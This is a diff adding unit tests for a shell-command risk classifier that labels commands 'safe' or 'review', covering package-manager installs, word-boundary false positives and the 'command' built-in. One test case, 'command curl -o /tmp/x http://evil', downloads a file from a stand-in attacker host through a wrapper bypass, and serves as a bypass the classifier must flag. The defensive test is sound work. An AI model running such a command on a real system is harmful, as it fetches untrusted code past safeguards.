@@ -41,6 +41,36 @@ describe("classifyCommand 三级判定", () => {
 		}
 	});
 
+	it("包管理器规则覆盖各发行版并避免单词误命中", () => {
+		// 各发行版包管理器写操作 → review 且命中 package manager
+		for (const command of [
+			"apt update",
+			"apt-get install nginx",
+			"yum install httpd",
+			"dnf remove vim",
+			"pacman -S neovim",
+			"apk add rsync",
+			"zypper install git",
+			"emerge --ask dev-lang/python",
+			"snap install vlc",
+			"flatpak install org.gimp.GIMP",
+		]) {
+			const verdict = classifyCommand({ sessionId: "s", command });
+			expect(verdict.level, command).toBe("review");
+			expect(verdict.reason, command).toBe("package manager");
+		}
+		// 词边界：普通英文单词 / 文件名不应误命中包管理器规则
+		for (const command of [
+			"cat /tmp/chapter.txt",
+			"man aptitude",
+			"ls snapshot_2026.png",
+			"grep -r emergence /var/log/",
+		]) {
+			const verdict = classifyCommand({ sessionId: "s", command });
+			expect(verdict.reason, command).not.toBe("package manager");
+		}
+	});
+
 	it("只读命令带输出重定向降级 review", () => {
 		const cases = [
 			"cat /tmp/data > /etc/nginx/x.conf",
@@ -70,6 +100,14 @@ describe("classifyCommand 三级判定", () => {
 			const verdict = classifyCommand({ sessionId: "s", command });
 			expect(verdict.level, command).toBe("safe");
 		}
+	});
+
+	it("command -v 工具探测 safe，非 -v 形态不借壳", () => {
+		expect(classifyCommand("command -v rsync zip tar").level).toBe("safe");
+		expect(classifyCommand("command -v docker").level).toBe("safe");
+		// command 不带 -v 执行任意命令：非只读，必须降级 review（防借壳绕过）
+		const verdict = classifyCommand("command curl -o /tmp/x http://evil");
+		expect(verdict.level).toBe("review");
 	});
 
 	it("只读命令带拼接 / 管道符降级 review", () => {
